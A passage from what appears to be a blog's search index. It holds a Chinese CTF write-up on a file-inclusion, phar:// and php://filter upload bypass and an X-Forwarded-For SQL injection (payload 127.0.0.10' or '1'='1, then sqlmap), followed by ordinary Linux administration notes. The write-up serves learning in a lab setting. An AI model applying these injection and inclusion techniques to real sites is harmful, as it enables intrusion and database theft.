--&gt;，好像可以读取文件。尝试读一下”index.php”，页面就开始不断地输出上面那张图的内容。后来反应过来是一个文件包含，递归地包含了”index.php”文件的内容。然后尝试访问一下”something.php”文件，说让我访问”upload.php”,访问发现是个文件上传。上传成功后会返回文件路径，但只能上传TXT文件，而且会被强制改名：文件上传、重命名、文件包含，应该联想到利用”phar://”协议绕过。不过当在”index.php”使用”phar://”协议的时候却被禁止了：说明”upload.php”或许也提供了文件包含接口。可以尝试利用”php://filter”读取”upload.php”的内容，获得接口后上传文件即可读取flag内容。备注  要亲自实现一下”phar://”协议绕过。unctf_Simple_Calc_1题目描述有两个提示：  Hint1:XFF伪造  Hint2:用 SQLMAP 到处跑跑试试- -？打开页面真的是个计算器：解题思路点击右上角的”信息”，可以发现使用计算机的次数被记录了。猜测可能是服务器记录了我的IP的访问次数，结合提示，这是一个XFF的SQL注入。抓包可以发现，每次刷新页面都会额外产生一个访问”/backend/”的请求，返回的就是使用次数。因为我的Hackbar不能用，直接在Burpsuite中尝试注入。用XFF伪造一个新的IP访问，多次访问，确实次数增加了，然后开始注入测试。Payload为：127.0.0.10' or  '1'='1时功能正常，结合Sqlmap爆数据库。备注  首先是要准备一个Hackbar。  其次继续学习Sqlmap脚本。]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux进程管理]]></title>
      <url>/notes/2019/09/21/Linux-Process/</url>
      <content type="text"><![CDATA[什么是进程进程用来表示正在运行的程序。在Linux内核中维护着一张表，记录了当前系统中运行的所以进程的各种信息。内核中一些重要的进程的信息如下：            进程的内存地址                  进程当前的状态              进程正在使用的资源              进程的优先级（谦让度）              进程的属主      进程的属性一个进程包含了多个属性参数，决定了进程被处理的先后顺序、能够访问的资源等。下面介绍几个常用参数。PID：进程的ID号Linux使用进程的唯一ID来标示进程，称作PID。同样用户与系统进行交互时也使用PID，而不是进程名。PPID：父进程的ID除了在系统引导时由内核自主创建并安装的那几个进程，Linux中所有的进程都必须由另一个进程创建。这样就出现了父进程的概念，使用PPID来表示。UID和EUID：真实和有效的用户ID只有进程的创建者和root用户才可以对进程进行操作，Linux使用UID来标示进程的创建者。Linux还为进程保存了一个“有效用户ID”，称作EUID，用来表示进程对于文件和资源的访问权限。GID和EGID：真实和有效的组ID与UID和EUID类似的还有GID和EGID，分别表示真实组ID和有效组ID。谦让度和优先级进程的优先级决定了其收到CPU“有优待”的程度。优先级高的进程能够被更早地处理，并获得更多的处理器时间。Linux内核会综合考虑一个进程的各种因素来决定其优先级，包括进程已经消耗的CPU时间、进程已经等待的时间等。在绝大多数情况下，决定进程何时被处理是内核的事情，不需要用户插手。用户可以设置进程的“谦让度”来影响内核的决定。顾名思义，谦让度高往往会获得更高的优先级。监视进程：ps命令使用ps命令来监视系统进程。如下命令将显示当前系统上运行的所有进程的信息。$ ps auxps命令将返回一个表格，以下是表格的表头字段和具体含义：            字段      含义                  USER      进程的创建者              PID      进程的ID              %CPU      进程的CPU占用率              %MEM      进程的内存占用率              VSZ      进程占用的训内存大小              RSS      内存中页的数量（页是管理内存的单位，PC上通常为4K）              TTY      进程所在终端的ID              STAT      进程的状态              START      进程启动的时间              TIME      进程已占用的CPU时间              COMMAND      命令和参数      以下是STAT字段支持的参数：            参数      含义                  R      正在运行/可运行              D      睡眠中（不可被唤醒，通常是在等待I/O设备）              S      睡眠中（可被唤醒）              T      停止（由于收到信号或被跟踪）              Z      僵进程（已经结束而没有释放系统资源的进程）      以下是STAT字段支持的附加标志：            附加标志      含义                  &lt;      进程拥有比普通优先级高的优先级              N      进程拥有比普通优先级低的优先级              L      有些页面被锁在内存中              s      会话的先导进程      ps命令的另一组选项lau可以提供父进程ID（PPID）和谦让度（NI）。即时跟踪进程信息：top命令ps命令可以一次性给出当前系统中进程信息的快照，但这样缺乏时效性。管理员可能要通过不停使用ps命令来更新信息。Linux提供了top命令用于即时跟踪系统中的进程情况。以下命令会即时显示系统进程信息。$ toptop命令的返回信息会占满一页，并即时更新，依据CPU的使用率排序。可使用命令q退出程序。查看占用文件的进程：lsof命令可以使用lsof命令来查看占用某个文件的进程。以下命令将显示占用了foo.txt文件的进程的信息。$ lsof foo.txt向进程发送信号：kill命令使用kill命令可杀死指定进程。如下命令将会终止PID为1234的进程。$ kill 1234kill命令不只可被用于杀死进程，实际上它是一条用于和进程通讯的命令，它可以接受很多参数。实例kill -l来查看其具体接受的参数。kill 1234命令等同于kill -TERM 1234或者kill -SIGTERM 1234。调整进程的谦让度：nice和renice命令使用nice命令可以某一指定谦让度启动一个进程。如下命令会启动foo进程，并将其谦让度增量设为2。$ nice -n 2 foo-n参数用于设置谦让度增量。也可以使用renice命令来调整已运行进程的谦让度。下面命令会将PID为1234的进程的谦让度调整为12。$ renice +12 -p 1234-p参数用于接受进程ID。进程的谦让度继承自父进程，由此引伸出了谦让度增量的概念。进程的属主可以自由提高进程的谦让度，但若想降低谦让度则需要root权限。]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Linux </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux磁盘管理]]></title>
      <url>/notes/2019/09/20/Linux-Disk/</url>
      <content type="text"><![CDATA[关于硬盘硬盘根据不同的接口主要可分为IDE、SCSI、SATA三类，使用IDE接口的设备被称作hd，使用SCSI和SATA接口的设备被称作sd，以英文字母标示顺序，以sd为例，第一块硬盘被称作sda，第二块被称作sdb，以此类推。Linux规定一个硬盘最多有4个主分区，分别被命名为sda1、sda2、sda3和sda4。逻辑分区则从5开始标示，逐个递增1，数量没有限制。一个硬盘上最多有4个分区，即主分区和扩展分区，若主分区有4个则不设扩展分区。扩展分区不直接使用，在其上可划分若干个逻辑分区以供使用。Linux文件系统在Windows下，有NTFS和FAT两种文件系统，Linux下也有自己的文件系统。ext3fs系统和ext4fs系统ext4fs(Fourth Extended File System)是对ext3fs(Third Extended File System)的扩展和改善。ext4fs改良了日志功能，也大大地增加了文件系统的可靠性。日志功能是基于灾难恢复的需求而诞生的。文件系统预留一块区域来保存日志文件，当对文件进行写操作时，所有修改先写入日志文件，随后才会做出实际修改。这样当系统崩溃后就可以根据日志来恢复文件系统。常用文件系统的表示方法以下是常用文件系统的表示方法：            表示方法      描述                  ext2      Linux的ext2文件系统              ext3      Linux的ext3文件系统              ext4      Linux的ext4文件系统              vfat      Windows的FAT16/FAT32文件系统              ntfs      Windows的NTFS文件系统              iso9660      CD-ROM光盘的标准文件系统      swap分区swap不是文件系统，它是Linux下的一个分区，称作交换分区，作用类似于虚拟内存。即当物理内存不够用时，临时使用虚拟内存来放置一部分不常用的信息。挂载文件系统Linux下设备的表示方法Linux下所有的设备都被当作文件来操作，每个设备都被映射为一个特殊文件，称作“设备文件”，被放置在/dev目录下，对上层引用而言所有的设备操作都通过文件读写实现。这些文件大多是块设备文件和字符设备文件，块设备可以随机地读写，如硬盘，字符设备只能按顺序地接受字符流，如打印机。用户不能通过直接通过操作文件访问存储设备，所有的存储设备在使用前都要挂载到某个目录下，然后就可以像操作目录一样使用这个设备了。挂载文件系统挂载是指由操作系统使一个存储设备上的计算机文件和目录可供用户通过计算机文件系统访问的一个过程。通过mount命令可以挂载文件系统。如下命令会将sda3硬盘分区挂载到/foo目录下。$ mount /dev/sda3 /foomount会自动检测设备上的文件系统，并以相应的类型进行挂载。可以使用-r或-w选择，分别指定以只读或是读写模式挂载设备，-w是默认选项。卸载文件系统使用umount命令来卸载文件系统。如下命令将会卸载/dev/sda3上的文件系统。$ umount /dev/sda3文件系统只有在没有被使用的情况下才可以被卸载，使用-r参数，可以在设备正忙时以只读方式重新挂载文件系统。查看磁盘的使用情况检查和修复文件系统在磁盘上建立文件系统使用USB设备压缩工具gzip工具使用gzip命令来压缩文件。以下命令会将foo文件压缩为foo.gz文件。$ gzip foo使用gunzip命令来解压文件。以下命令会将foo.gz文件解压为foo文件。$ gunzip foo.gz解压时仅支持.gz、.Z、-gz、.z和-z这样的扩展名。可以使用-l选项来查看压缩文件的压缩效果。-t选项来测试压缩文件的完整性，文件完整则不会有任何返回。增加-v选项以在详细模式下获得返回信息。bzip2工具bzip2提供了更高的压缩率。文件压缩的语法与gzip相同，它也包含了与gzip相同的-t和-v选项。解压使用-d选项或使用bunzip2命令。以下两条命令均可解压foo.bz2文件为foo文件。$ bzip2 -d foo.bz2$ bunzip foo.bz2如果压缩文件不以.bz2、.bz、.tbz2、.tbz或.bzip2结尾，解压得到的文件将增加“.out”作为扩展名。存档工具tar工具使用tar命令来打包文件。以下命令会将当前目录下的foo子目录打包为bar.tar文件。$ tar -c -f bar.tar foo以下是tar命令常用的选项：            选项      描述                  -c      打包文件的选项              -x      解开文件的选项              -f      指定归档文件的文件名              -v      显示该命令的执行过程              -w      每次将单个文件加入或抽出时询问用户意见              -z      打包文件后或解开文件前使用gzip压缩或解压文件              -j      打包文件后或解开文件前使用bzip2压缩或解压文件      安装硬盘和分区高级硬盘管理备份工作和系统]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Linux </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux软件包管理]]></title>
      <url>/notes/2019/09/19/Linux-Package/</url>
      <content type="text"><![CDATA[软件包管理系统概述常用的软件包格式RPM：Red Hat Package Manager的缩写，大部分的Linux发行版支持的格式。DEB：Debian上使用的软件包格式，也被使用在Ubuntu上。高级软件包管理工具APT：Advanced Package Tool的缩写，现今最成熟的软件包管理器，支持以上两种软件包格式，可以自动搜寻依赖关系并执行安装。YUM：Yellow dog Updater, Modified的缩写，仅支持RPM格式。管理DEB软件包安装软件包使用dpkg命令和-i(–install)选项来安装DEB软件包。以下命令将安装foo.deb软件包。$ dpkg -i foo.deb-i选项将自动删除系统上原有的旧版本。如果安装过程出现依赖和兼容问题，该命令会报错并停止，可以使用–force-选项忽略它们，并强制安装，不过这并不被推荐。查看已安装的软件包使用dpkg命令和-l选项来查看已安装的软件包，可以结合grep命令查找特定的软件包。如下命令将查找系统中的PHP版本信息。$ dpkg -l | grep php也可以使用-S(–search)选项相关软件包内容的安装位置。如下命令将查看系统PHP软件包所有文件的位置。$ dpkg -S php卸载软件包使用dpkg命令和-r(–remove)选项来卸载软件包。如下命令将卸载foo软件包。$ dpkg -r foo所卸载的软件包可能包含其它软件所需要的依赖，请谨慎使用。也可以使用高级软件包工具。管理RPM软件包安装软件包使用rpm命令和-i选项来安装软件包。rpm提供了-v和-h选项，前者用于显示该命令正在进行的工作，后者将使用一系列的“#”符号来表示安装进度。如下命令将安装foo.rpm软件包，并显示安装内容和进度。$ rpm -i -v -h foo.rpmrpm命令也提供了–force选项，与dpkg命令的–force-选项类似。升级软件包使用rpm命令和-U选项来升级软件包。如下命令会将foo软件升级到2.0版本。$ rpm -U foo-2.0.rpm查看已安装的软件包使用rpm命令和-q选项来查看软件包信息，用户应指定软件包的名字而非安装文件的名字。以下命令将列出foo软件的具体版本信息。$ rpm -q foofoo-2.0增加-a选项可以列出系统上所有的软件包信息，结合grep命令可以查找特定的软件包。卸载软件包使用rpm命令和-e选项来卸载软件包。以下命令将卸载foo软件包。$ rpm -e foo在相互依赖关系的问题上rpm命令与dpkg命令类似，不过rpm命令会及时停止卸载，可以使用–nodeps继续完成卸载。该命令提供了–test选项，该选项下rpm工具将模拟卸载操作，而不真的执行。同时结合-vv选项来输出完整的调试信息。高级软件包工具下载和安装软件包使用apt-get命令来下载软件包，不过在下载前需要对软件包信息进行更新。如下命令将下载最新的foo软件包。$ apt-get update$ apt-get foo以下是apt-get的常用命令：            命令      描述                  apt-get install      下载并安装特定的软件包              apt-get upgrade      将系统上所有的软件包更新至最新版本              apt-get remove      卸载特定的软件包              apt-get source      下载特定包的源代码文件              apt-get clean      删除所有已下载的包文件      默认安装位置通过apt-get安装的应用程序一般被安装/usr目录下。二进制文件在/usr/bin文档在/usr/share配置文件在/etc共享库文件在/usr/lib查询软件包信息使用apt-cache search命令可根据软件包名字的一部分来从软件包列表中检索已安装和可安装的软件包。如下命令将检索带“foo”字样的软件包。$ apt-cache search foo使用apt-cache depends命令可列出特定软件包的依赖关系。配置APTAPT工具从网络上的一些地址下载软件包，它们被称作安装源。源列表被放在/etc/apt/sources.list中，这是一个文本文件，可自由编辑。使用图形化的APTUbuntu上提供了“新立得软件包管理器”，可以使用图形化的APT工具。安装步骤一般为：搜索所需的软件包；双击软件包以标记；根据提示标记相应的依赖；应用标记的选项以完成下载；下载结束后系统将自动安装和配置该软件。从源代码编译软件下载和解压软件包通过官方渠道下载到相应的软件源代码。下载到的文件一般以“.tar.bz2”或“.tar.gz”这样的压缩格式打包，可以使用tar zxvf命令解压。如下命令将解压foo.tar.gz压缩包。$ tar zxvf foo.tar.gz正确配置软件Linux上所有软件都使用configure脚本来配置以源代码形式发布的软件。configure脚本根据用户提供的相关参数生成对应的makefile文件，后者指导了make命令的编译。configure脚本一般都提供–prefix选项，用于指定软件安装的位置。如下命令指定将软件安装到/foo目录下。$ ./configure --prefix=/foo不同的软件提供了不同的configure脚本选项，可以通过查看软件的安装文档了解。它们一般被命名为README或INSTALL。输入配置命令后如果没有任何输出即代表配置成功了，在Linux上我们相信没有消息就是好消息。编译源代码直接在源文件目录下使用make命令即可完成编译，如果没有任何报错的话。make命令将会根据makefile文件中的规则调用合适的编译器来编译源代码。安装软件到硬盘最后在源文件目录下使用make install命令安装软件。该命令会将需要的文件复制到之前指定好的安装目录。如果之前没有指定安装目录默认将会安装到/usr/local目录下。]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Linux </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux文件目录管理]]></title>
      <url>/notes/2019/09/18/Linux-File/</url>
      <content type="text"><![CDATA[Linux文件系统的架构Linux根目录下的主要内容以下是Linux系统主要目录及其内容：            目录      内容                  /bin      存放系统常用的二进制可执行文件，即常用命令              /boot      内核与启动文件              /dev      各种设备文件              /etc      系统软件的启动和配置文件              /home      用户的主目录              /lib      C编辑器的库              /media      可移动介质的安装点              /opt      额外安装的应用软件包存放位置              /proc      进程的映像              /root      超级用户root的主目录              /sbin      和系统操作有关的命令              /tmp      共用的临时文件存放点              /usr      非系统必需的应用程序              /var      系统专用的数据和配置文件      Linux /usr目录下的主要内容以下是/usr目录下的主要内容：            目录      内容                  /usr/bin      绝大部分的用户命令              /usr/include      C/C++等程序语言的头文件              /usr/local      本地系统管理员自行安装的应用程序              /usr/sbin      非系统正常运行所需要的系统指令              /usr/share      共享文件              /usr/src      应用程序的源码      建立文件和目录建立目录使用mkdir命令一次建立一个或几个目录。如下命令在当前目录下建立foo和bar两个目录。$ mkdir foo bar也可以使用绝对路径来建立目录。$ mkdir /foo/bar使用该命令时若目录/foo不存在将会报错，使用参数-p可以完整地创建一个子目录。$ mkdir -p /foo/bar建立空文件使用touch命令来建立空文件。如下命令在当前目录下建立一个名为foo的文件。$ touch foo使用该命令建立的文件不包含任何内容。也可以使用touch命令来更新一个文件的建立日期和时间，而不会修改文件内容。移动、复制和删除移动和重命名使用mv命令来移动文件。如下命令可将hello文件移动到test目录下。$ mv hello test/该命令将会默认覆盖掉目标目录下的同名文件，使用参数-i可发现这样的情况。也可以使用-b参数，目标目录下的同名文件的文件名后将会被加上“~”。$ mv -b hello test/$ lshello	hello~mv命令也可用于重命名文件。如下命令可将hello文件重命名为hello_bak。$ mv hello hello_bak复制文件和目录使用cp命令来复制文件。如下命令可将hello文件复制到test目录中。$ cp hello test/cp命令的-i和-b参数与mv命令类似。产品命令在执行复制任务是默认跳过目录，使用-r参数完成对目录及其下文件的复制。删除文件和目录使用rm命令可一次删除一个或几个文件。如下命令将会删除当前目录下的所以php文件。$ rm *.php该目录直接删除文件，而不是放入类似“回收站”的临时目录，使用-i参数在删除每一个文件前询问。使用-r参数将会递归地删除目录下所有的文件和子目录。也可以使用rmdir命令来删除一个空的目录。文件和目录的权限查看文件和目录的属性使用ls命令和-l参数以查看文件属性，包括权限。$ ls -l-rw-r--r-- 1 glyuan glyuan 0 2019-9-18 19:42 Hello我们关注第一个字段的第二个到第十个字符，在上例中是“rw-r–r–”，应该这样断句：rw-、r–、r–，分别表示所有者、组成员和其他用户说拥有的权限，rwx依次表示读取、写入、执行权限，若某个权限被禁用，使用“-”代替。第三和第四个字段分别表示文件的属主和属组，上例中为glyuan用户和glyuan组。改变文件所有权使用chown命令来改变文件所有权。以下命令将改变hello文件的属主和属组分别为glyuan用户和root属组。$ chown glyuan:root hello使用-R参数可同时修改一个目录下所以文件和子目录的所有权。也可以使用chgrp命令修改文件的属组。$ chgrp root hello改变文件权限使用chmod命令修改文件权限，该命令使用“用户组+/-权限”的方式修改权限。u、g、o、a分别表示文件属主、文件属组、其他人和所有人。如下命令增加了属主对hello文件的执行权限。$ chmod u+x hello同理，如下命令将删除所有人对hello文件的执行权限。$ chmod a-x hello也可以使用“用户组=权限”的方式修改权限。如下命令为属主和属组设定了读写权限，而仅赋予其他用户读取权限。$ chmod ug=rw,o=r hello还可以使用“用户组1=用户组2“的方式为用户组1赋予与用户组2相同的权限。chmod命令还支持八进制的文件权限表示方法，如下命令将hello文件的所有权限赋予属主，而只赋予属组和其他人执行权限。$ chmod 711 hello一下为八进制、二进制、文件权限的对应关系：            八进制      二进制      权限                  0      000      —              1      001      –x              2      010      -w-              3      011      -wx              4      100      r–              5      101      r-x              6      110      rw-              7      111      rwx      查看文件类型使用ls命令和-l参数以查看文件属性。$ ls -l-rw-r--r-- 1 glyuan glyuan 0 2019-9-18 19:42 Hello第一个字段的第一个字符表示文件类型。以下为Linux中的文件类型：            文件类型      符号                  普通文件      -              目录      d              字符设备文件      c              块设备文件      d              本地域套接口      s              有名管道      p              符号链接      l      符号链接类似Windows中的快捷方式，使用ln命令和-s参数创建符号链接。如下命令将为target文件创建一个名为link的链接。$ ln -s target link输入输出重定向和管道输出重定向程序默认输出于标准输出，标准输出默认指向显示器。可以使用“&gt;”符号将输出重定向到指定位置。如下命令会将ls命令的返回内容重定向到out文件。$ ls &gt; out若out文件不存在，该命令将先创建out文件，若存在，该命令将删除原有内容重新写入。可使用“»”符号追加写入。输入重定向与标准输出类似，默认的标注输入指向键盘。可以使用“&lt;”符号将输入重定向到指定位置。如下命令中，程序会从in文件中读取内容作为标准输入。$ cat &lt; in管道            使用“      ”符号将一条命令的输出作为另一条命令输入。以下命令会在当前目录中查找包含字符foo的文件。      $ ls | grep foo]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Linux </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
